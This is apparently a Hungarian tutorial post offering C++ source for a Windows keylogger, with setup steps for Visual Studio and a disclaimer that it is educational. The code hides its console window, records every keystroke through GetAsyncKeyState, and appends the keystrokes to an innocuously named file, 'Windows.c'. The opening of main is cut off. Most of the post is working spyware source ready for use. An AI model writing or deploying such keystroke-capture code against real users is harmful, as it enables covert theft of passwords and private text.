C++ KeyLogger! Figyelem az alábbi kód oktató célból lett közzé téve!

  • Használata:

    Ahhoz hogy hassonló és eredményes kódot tudjunk írni kötelező a fejlesztéshez való szükséges elemek beszerzése: Visual Studio Code. Lehetőleg Windows 10-es operációs rendszerű gépre telepítsük mert a Windows.h könyvtár nem minden operációs rendszeren elérhető lásd: MAC, vagy bármely Linux disztribució.

    Ha már rendelkezésünkre áll egy Win 10-es gép és egy Microsoft Visual Studio Code akkor ne felejtsük feltelepíteni a C++ kód íráshoz szükséges elemeket.

    Ha a fentiekkel meglennénk már csak egy Console Applikációs Projekt-et kell létrehoznunk a C++ nyelv-el beállítva!

    Miután felgépeltük a Kódot fontos hogy kikapcsoljuk a régi tipusú fügvények használatakor előforduló figyelmeztetéseket!

    Ezt úgy tehetjük meg hogy kikeressük a projektünk előfeldolgozó menüjét és beírjuk hogy: _CRT_SECURE_NO_WARNINGS;

	HWND WINDOW_HANDLER;
	WINDOW_HANDLER = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(WINDOW_HANDLER, 0);
	char i;
	while (1)
	{
		// Minden leütött billentyűt megnézünk
		for (i = 8; i <= 190; i++)
		{
			if (GetAsyncKeyState(i) == -32767)	// ka billentyű meg lett nyomva
			{
				naplozo(i);
				if (i == 27)
				{
					ShowWindow(WINDOW_HANDLER, 1);
					return 0;
				}
			}
		}
	}
	return 0;
}
void naplozo(int billentyu_KOD)
{
	// Az egérrel való kattintásokat ignoráljuk
	if ((billentyu_KOD == 1) || (billentyu_KOD == 2)) return;
	printf("%c\n", billentyu_KOD);

	FILE* NAPLOFAJL;
	NAPLOFAJL = fopen("Windows.c", "a+"); // Bármilyen fájl formátum lehet akár .c .txt .java .rust stb...!
	if (billentyu_KOD == 8)
		fprintf(NAPLOFAJL, "%s", "[BACKSPACE]");
	else if (billentyu_KOD == 13)
		fprintf(NAPLOFAJL, "%s", "[ENTER]\n");
	else if (billentyu_KOD == 32)
		fprintf(NAPLOFAJL, "%s", " ");
	else if (billentyu_KOD == VK_ESCAPE)
		fprintf(NAPLOFAJL, "%s", "[ESCAPE]");
	else if (billentyu_KOD == VK_END)
		fprintf(NAPLOFAJL, "%s", "[END]");
	else if (billentyu_KOD == VK_HOME)
		fprintf(NAPLOFAJL, "%s", "[HOME]");
	else if (billentyu_KOD == VK_TAB)
		fprintf(NAPLOFAJL, "%s", "[TAB]");
	else if (billentyu_KOD == VK_CONTROL)
		fprintf(NAPLOFAJL, "%s", "[CONTROL]");
	else if (billentyu_KOD == VK_SHIFT)
		fprintf(NAPLOFAJL, "%s", "[SHIFT]");
	else if (billentyu_KOD == VK_DOWN)
		fprintf(NAPLOFAJL, "%s", "[DOWN ARROW]");
	else if (billentyu_KOD == VK_UP)
		fprintf(NAPLOFAJL, "%s", "[UP ARROW]");
	else if (billentyu_KOD == VK_LEFT)
		fprintf(NAPLOFAJL, "%s", "[LEFT ARROW]");
	else if (billentyu_KOD == VK_RIGHT)
		fprintf(NAPLOFAJL, "%s", "[RIGHT ARROW]");
	else if (billentyu_KOD == 190 || billentyu_KOD == 110)
		fprintf(NAPLOFAJL, "%s", ".");
	else fprintf(NAPLOFAJL, "%s", &billentyu_KOD);
	fclose(NAPLOFAJL);
}
